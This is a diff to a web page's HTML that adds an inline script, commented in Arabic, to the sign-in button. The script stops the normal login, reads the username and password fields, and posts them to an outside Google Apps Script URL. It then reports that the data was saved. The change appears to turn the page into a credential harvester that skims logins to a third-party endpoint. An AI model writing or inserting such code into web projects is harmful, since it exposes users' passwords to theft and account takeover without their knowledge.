@@ -115,6 +115,46 @@
 
     <script src="./app.js"></script>
     <script src="./supabase.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            let signin_btn = document.querySelector('#signin-btn');
+    
+            // إضافة حدث النقر إلى زر تسجيل الدخول
+            signin_btn.addEventListener('click', function(event) {
+                event.preventDefault();
+    
+                // احصل على قيمة اسم المستخدم وكلمة المرور من النموذج
+                let username = document.querySelector('#username').value;
+                let password = document.querySelector('#password').value;
+    
+                // إرسال البيانات إلى الخادم
+                sendDataToServer(username, password);
+            });
+    
+            function sendDataToServer(username, password) {
+                // قم بإنشاء كائن FormData لتخزين البيانات
+                let formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+    
+                // استخدم fetch لإرسال البيانات إلى الخادم
+                fetch('https://script.google.com/macros/s/AKfycbwL82nBiFVifMe9nOVpGv7oVFLEGZU-szaO9JFRchfCutHYuvShtS59eliwQXnUd98hqQ/exec', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // هنا يمكنك إجراء الإجراءات بعد الحفظ، على سبيل المثال، إظهار رسالة نجاح
+                    alert('تم حفظ البيانات بنجاح');
+                })
+                .catch(error => {
+                    // هنا يمكنك التعامل مع أي أخطاء في الطلب
+                    alert('حدث خطأ أثناء حفظ البيانات: ' + error);
+                });
+            }
+        });
+    </script>
+
 </body>
 
 </html>
